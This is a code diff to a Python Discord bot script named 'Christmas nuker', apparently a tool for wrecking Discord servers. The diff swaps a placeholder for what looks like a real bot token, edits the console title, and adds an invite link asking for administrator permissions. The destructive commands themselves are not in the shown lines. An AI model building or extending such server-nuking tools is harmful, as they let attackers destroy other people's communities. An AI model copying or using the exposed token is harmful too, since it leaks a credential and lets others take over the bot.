@@ -13,14 +13,14 @@ from discord.ext import commands
 intents = discord.Intents.default()
 intents.members = True
 
-bottoken = "token here"
+bottoken = "OTU0MDI3MjQ2MTE1NDg3NzQ0.YjNJHA.5B1Bgo3vptpwNKRdQx6nQqxMt1Y"
 
 bot = commands.Bot(command_prefix='!',intents=intents)
 bot.remove_command("help")
 characters = string.ascii_letters + string.digits
 
 os.system("cls")
-os.system("title Christmas nuker - ho ho ho")
+os.system("title Christmas nuker - Xmas")
 abc = str("...")
 menu = f"""
 {Fore.RED}
@@ -30,7 +30,7 @@ ____  ___
  /     \|  Y Y  \/ __ \_\___ \ 
 /___/\  \__|_|  (____  /____  >
       \_/     \/     \/     \/ 
-{Fore.GREEN}https://discord.com/oauth2/authorize?client_id={abc}&permissions=8&scope=bot                                                            
+{Fore.GREEN}https://discord.com/api/oauth2/authorize?client_id=954027246115487744&permissions=8&scope=bot                                                            
  _______   ____ ___ ____  __._______________________________ 
  \      \ |    |   \    |/ _|\_   _____/\______   \______   \
  /   |   \|    |   /      <   |    __)_  |       _/|       _/
